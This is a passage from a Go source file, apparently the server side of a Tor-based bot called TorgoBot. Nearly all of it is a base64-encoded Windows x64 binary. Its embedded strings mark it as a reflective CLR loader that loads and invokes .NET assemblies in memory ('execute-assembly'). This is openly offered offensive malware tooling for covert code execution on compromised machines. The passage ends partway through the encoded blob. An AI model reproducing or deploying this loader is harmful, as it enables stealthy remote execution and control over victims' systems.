package main

import (
	"bytes"
	"context"
	b64 "encoding/base64"
	"fmt"
	"github.com/x3419/TorgoBot/Server/execute-assembly"
	"github.com/x3419/TorgoBot/Server/tor/tor"
	"io/ioutil"
	"log"
	"net/http"
	//"os"
	"os/exec"
	"strings"
	"time"
)

var x64CLR string = "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